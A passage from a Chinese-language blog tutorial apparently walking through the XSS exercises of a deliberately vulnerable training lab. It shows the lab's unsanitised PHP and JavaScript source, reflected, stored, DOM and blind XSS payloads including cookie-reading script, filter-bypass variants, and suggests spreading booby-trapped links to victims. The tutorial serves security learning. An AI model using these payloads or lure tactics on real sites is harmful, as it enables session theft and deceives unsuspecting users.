</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;xssr_main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_title&#34;</span><span class="p">&gt;</span>Which NBA player do you like?<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;get&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_in&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;20&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;message&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_submit&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;notice&#39;</span><span class="p">&gt;</span>who is <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;打个胶先&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>,i don&#39;t care!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>原理还是非常好理解的</p>
<p>完毕，我们来看看后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;xss_reflected_get.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;输入&#39;kobe&#39;试试-_-&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;kobe&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;愿你和</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">一样，永远年轻，永远热血沸腾！&lt;/p&gt;&lt;img src=&#39;</span><span class="si">{</span><span class="nv">$PIKA_ROOT_DIR</span><span class="si">}</span><span class="s2">assets/images/nbaplayer/kobe.png&#39; /&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;who is </span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">,i don&#39;t care!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>可以看到，后端并未对GET请求的消息做任何过滤处理，这也给了我们很多可乘之机</p>
<p>下面我们来看看这种XSS漏洞有什么利用的场景</p>
<p>因为表单提交属性是GET请求，所以我们的输入都会如实反映在URL中：</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%27%E6%89%93%E4%B8%AA%E8%83%B6%E5%85%88%27%29%3C%2Fscript%3E&amp;submit=submit#
</code></pre><p>打开URL就会自动提交GET请求，执行嵌入的JavaScript代码：</p>
<p><img alt="img" src="./img/2022082-app.png"></p>
<p>所以我们就可以通过向网络散布这种暗藏恶意嵌入的链接，不知情的人以为只是正常站点（比如说某些大网站），只要他们一点开就会中招而毫无察觉</p>
<h4 id="post">POST</h4>
<p>POST型其实与GET型原理一致，但是POSY请求并不会反映到URL上，这使得漏洞利用难度增大</p>
<p>一般而言可以通过伪造表单页面，诱导被攻击者访问并登录伪造页面，伪造页面的JS脚本在其点击登录时向正确提交POST请求触发XSS漏洞，并将被攻击者页面重定向至正常页面，从而在被攻击者未发觉的情况下完成攻击</p>
<h3 id="存储型xss">存储型XSS</h3>
<p>来看到一个留言板</p>
<p><img alt="img" src="./img/2022080-4.png"></p>
<p>然后是基操试探一下</p>
<p><img alt="img" src="./img/2022080-1-1-150x150.png"></p>
<p><img alt="img" src="./img/2022080-2-1-150x138.png"></p>
<p>看起来完全不设防，开始攻击，这次来点实在的，获取cookie试试：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022080-succ.png"></p>
<p>你以为这就结束了吗？没那么简单</p>
<p>存储型XSS之所以危害大，在于它是永久型的，在后台清除掉它之前都会一直作用</p>
<p><img alt="img" src="./img/2022080-f5-1.gif"></p>
<p>原理和源码问题和反射型基本一致，只多了一个保存到数据库，因此不再赘述</p>
<h3 id="dom型xss">DOM型XSS</h3>
<p>首先，DOM是什么？</p>
<blockquote>
<p>菜鸟教程</p>
<p>DOM (Document Object Model) 译为文档对象模型，是 HTML 和 XML 文档的编程接口。
HTML DOM 定义了访问和操作 HTML 文档的标准方法。
DOM 以树结构表达 HTML 文档。</p>
</blockquote>
<p><img alt="img" src="./img/202208htmltree.gif"></p>
<p>HTML DOM tree</p>
<p>简单来说就是HTML和XML提供给外部的接口，供脚本等程序对HTML或XML内容进行操作</p>
<p>详细的教程和文档可以参看<a href="https://www.runoob.com/htmldom/htmldom-tutorial.html">菜鸟教程</a></p>
<p>OK来看看场景</p>
<p>似乎是一个毫无特点意义不明的输入框</p>
<p><img alt="img" src="./img/2022080-0.png"></p>
<p>随便输入，看看返回些什么</p>
<p><img alt="img" src="./img/2022080-1-2.png"></p>
<p>输入的内容就是链接？看看源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;xssd_main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="kd">function</span> <span class="nx">domxss</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">                        <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;text&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;dom&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;&lt;a href=&#39;&#34;</span><span class="o">+</span><span class="nx">str</span><span class="o">+</span><span class="s2">&#34;&#39;&gt;what do you see?&lt;/a&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="c">&lt;!--&lt;a href=&#34;&#34; onclick=(&#39;xss&#39;)&gt;--&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;click me!&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;domxss()&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;dom&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>确实如此，那我们就可以层层分析构造payload了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;&#34;+str+&#34;&#39;</span><span class="p">&gt;</span>what do you see?<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;&#39;</span><span class="p">&gt;</span>&#34;&gt;what do you see?<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;#&#39;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;alert(&#39;打个胶先&#39;)&#34;</span><span class="p">&gt;</span>&#34;&gt;what do you see?<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>OK，那么<code>#' onclick=&quot;alert('打个胶先')&quot;&gt;</code>就是我们的payload了</p>
<p><img alt="img" src="./img/2022081-succ.png"></p>
<p><strong>成功</strong></p>
<p>很枯燥啊感觉，而且是不是觉得没什么冷用？来看看另一种情况</p>
<p><img alt="img" src="./img/20220800-0.png"></p>
<p>有点抽象</p>
<p>随便输入些什么</p>
<p><img alt="img" src="./img/20220800-1.png"></p>
<p>更抽象了</p>
<p>看看地址栏，发现是一个GET请求</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/xss/xss_dom_x.php?text=0721#
</code></pre><p>页面返回一个链接？点开看看</p>
<p><img alt="img" src="./img/20220800-2.png"></p>
<p>伤心往事？还有什么能比0721更爽的</p>
<p>点开链接后又多了个链接，新链接和第一种情况一样</p>
<p>那么应该要怎么利用呢？</p>
<p>先看看源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-content&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;xssd_main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="kd">function</span> <span class="nx">domxss</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">                        <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">;</span><span class="c1">//获取URL内容
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="kd">var</span> <span class="nx">txss</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;text=&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]);</span><span class="c1">//URL解码、分割
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="kd">var</span> <span class="nx">xss</span> <span class="o">=</span> <span class="nx">txss</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\+/g</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">);</span><span class="c1">//内容赋值给变量
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;dom&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;&lt;a href=&#39;&#34;</span><span class="o">+</span><span class="nx">xss</span><span class="o">+</span><span class="s2">&#34;&#39;&gt;就让往事都随风,都随风吧&lt;/a&gt;&#34;</span><span class="p">;</span><span class="c1">//变量内容写入链接标签
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="c">&lt;!--&lt;a href=&#34;&#34; onclick=(&#39;xss&#39;)&gt;--&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;get&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;请说出你的伤心往事&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;dom&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;#&#39;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#39;domxss()&#39;</span><span class="p">&gt;</span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>捋清逻辑之后就很简单了，依然使用上次的payload：<code>' onclick=&quot;alert('打个胶先')&quot;&gt;</code></p>
<p>输入之后点击返回的第二个链接</p>
<p><img alt="img" src="./img/2022081-succ.png"></p>
<p><strong>成功</strong></p>
<p>那么如何利用漏洞呢？</p>
<p>还记得提交的是GET请求吗？来看地址栏</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/xss/xss_dom_x.php?text=%23%27+onclick%3D%22alert%28%27%E6%89%93%E4%B8%AA%E8%83%B6%E5%85%88%27%29%22%3E#
</code></pre><p>我们只需要把嵌入恶意代码的链接散播出去就能达到攻击的目的了</p>
<p>还是觉得没什么冷用吗？你的感觉是对的。实际上，DOM型XSS危害比较小，但是作为一个漏洞我们依旧有必要拿出来学习讨论（好歹算个漏洞，给个面子）</p>
<h3 id="盲打">盲打</h3>
<p>XSS盲打是XSS的一种应用场景</p>
<p>先来看这个反馈留言框</p>
<p><img alt="img" src="./img/2022090-0.png"></p>
<p>日常试探一下</p>
<p><img alt="img" src="./img/2022090-try.png"></p>
<p><img alt="img" src="./img/2022090-received.png"></p>
<p>似乎没有反应，那就attack试试</p>
<p><img alt="img" src="./img/2022091-attack.png"></p>
<p>前端似乎没有任何反馈，是不是XSS失去了利用价值呢？其实不是，我们来看看网站管理员的页面</p>
<p>attack前：</p>
<p><img alt="img" src="./img/2022090-admin-1024x158.png"></p>
<p>确实没有进行过滤</p>
<p>attack后：</p>
<p><img alt="img" src="./img/2022091-admin-cookie.png"></p>
<p><img alt="img" src="./img/2022091-admin-cum.png"></p>
<p>赛博魅魔：还不能休息哦❤</p>
<p>可以看到，只要管理员打开一次页面就会被攻击两次（留言框+名字框）</p>
<p>虽然用户前端不会受到攻击，但是管理员后台会受到攻击，这也是为什么这种场景叫做“盲打”</p>
<p>本质上，XSS盲打利用的就是存储型XSS漏洞</p>
<h3 id="过滤">过滤</h3>
<p>开发人员常常会对前端输入内容进行层层设防，其中最常用的手段之一就是过滤</p>
<p>“道”高一尺，“魔”高一丈，测试人员也有自己的应对方法，那就是绕过</p>
<p>常见的绕过方法有：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">前端强制绕过：直接抓包重放或修改HTML代码
</span></span><span class="line"><span class="cl">大小写绕过：<span class="p">&lt;</span><span class="nt">SCriPt</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;打个胶先&#39;</span><span class="p">)&lt;/</span><span class="nt">ScRiPT</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">拼凑绕过：<span class="p">&lt;</span><span class="nt">sc</span><span class="err">&lt;</span><span class="na">script</span><span class="p">&gt;</span>ript&gt;alert(&#39;打个胶先&#39;)<span class="err">&lt;</span>/scr<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>ipt&gt;
</span></span><span class="line"><span class="cl">注释绕过：<span class="p">&lt;</span><span class="nt">scr</span><span class="err">&lt;!</span><span class="na">--test--</span><span class="p">&gt;</span>ipt&gt;alert(&#39;打个胶先&#39;)<span class="err">&lt;</span>/sc<span class="c">&lt;!--test--&gt;</span>ript&gt;
</span></span></code></pre></div><p>当然，仅仅这些方法是不足以应对思维缜密的开发人员的</p>
<p>下面是网上一份比较详细的XSS绕过思维导图：</p>
<p><img alt="img" src="./img/202209%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.png"></p>
<p>XSS绕过的方法有很多，取决于我们的扎实的前端基础、丰富的经验和巧妙的思路</p>
<p>OK那我们来实践一下</p>
<p>似乎是一个不设防的输入框？</p>
<p><img alt="img" src="./img/2022090-0-1.png"></p>
<p><img alt="img" src="./img/2022090-1.png"></p>
<p>别说0721这些话，不要怕，就是干！</p>
<p><strong>其实分号和斜杠也应该试探一下，这里疏忽了</strong></p>
<p>戳啦，过滤嘛</p>
<p><img alt="img" src="./img/2022090-2.png"></p>
<p><img alt="img" src="./img/2022090-3.png"></p>
